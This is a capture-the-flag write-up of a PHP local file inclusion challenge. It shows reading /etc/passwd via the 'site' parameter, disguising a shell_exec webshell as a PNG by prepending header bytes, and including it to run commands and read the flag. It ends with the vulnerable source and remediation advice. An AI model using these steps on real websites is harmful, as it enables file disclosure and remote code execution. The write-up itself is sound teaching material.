# Local Fun Inclusion

The [challenge website](http://lfi.hax1.allesctf.net:8081/) seems to be a service where we can upload images to share them with others.

Trying it out with a random image we get back an URL where the image was uploaded to:
```
http://lfi.hax1.allesctf.net:8081/index.php?site=view.php&image=uploads/4780d8b48598c1026ab47aaf008c08e4.jpg
```

Taking a closer look at the URL it looks like the images are uploaded to a subdirectory called `uploads` and given a random name.

We can also see that the page is still `index.php` but it also includes `view.php` with the `site` parameter.
This seems like a classic Local File inclusion and given the name of the challenge, this is likely the way to go.

So let's try to include something else than `view.php`.
`/etc/passwd` should exist on the server, so let's just try that: <http://lfi.hax1.allesctf.net:8081/index.php?site=/etc/passwd>.

And indeed we get back something that looks like `/etc/passwd` embedded on the page.

So maybe we can upload our own `.php` file to the server using the upload functionality and then include that file.
Then we could execute arbitrary code. Lets just try listing the files in the current directory:
```
$ cat exploit.php
<?php echo shell_exec('ls'); ?>
```

However, when we try to upload that file we get an error: `Invalid image extension!`

Trying to change the file extension to `.png` still gives an error: `Only pictures allowed!`

It looks like the server also checks the content of the file.
Maybe we can trick it by adding a small `PNG`-header to the start of the file.
Lets just take a few bytes from a random `.png` file and prepend it to the `.php` file.
```
$ head random.png -c 9 | cat - exploit.php > exploit.png
```

This shouldn't make a difference for execution because `php` ignores everything outside the `<?php ?>` tag.

And indeed this works! The server now thinks the file is an image and lets us upload it.
We can now include that uploaded file with <http://lfi.hax1.allesctf.net:8081/index.php?site=uploads/3cb3862a5151d99c7cc42a444f2bac15.png>
and we can see the output of the `ls` command after some garbage characters (the `PNG` header):
```
�PNG  css flag.php index.php js upload.php uploads view.php
```

`flag.php` looks interesting, but including it directly doesn't show anything.
But we can just upload another file that prints the content of `flag.php`:
```
<?php echo shell_exec('cat flag.php'); ?>
```

We don't immediately see anything in the browser but looking at the source code we finally find the flag:
```
$FLAG = "CSCG{G3tting_RCE_0n_w3b_is_alw4ys_cool}";
```

We can also use the same way to have a look at the `index.php` file and see what the problem is:
```
<?php
    $site = $_GET["site"];
    if (!isset($site))
    {
        $site = "upload.php";
    }
    if (file_exists($site) && $site != "index.php")
    {
        include($site);
    }
    else
    {
        echo '<div class="container"><div class="alert alert-danger" role="alert">Site "' . htmlspecialchars($site) . '" cant be included!</div>';
    }
?>
```

The pages just includes the file given by the user-specified `GET`-parameter `site`.
Letting users include arbitrary files is obviously never a good idea.
This can be used to leak all files that the webserver has access to
and in this case, it's especially bad because the file even gets executed as PHP code.

Even when users can't easily upload files to the server this is a bad idea.
Attackers can still leak all files on the server and it might still be possible
to execute arbitrary code by for example sending a request with PHP-code in the URL
and later including server log files that will then contain the code.

Generally `include` and similar functions should never be used with a filename that
can be controller by a user. Instead, a user-given parameter can be used to look up
the correct filename to include from a dictionary. This is also better than simply
checking the filename, which is prone to bugs.
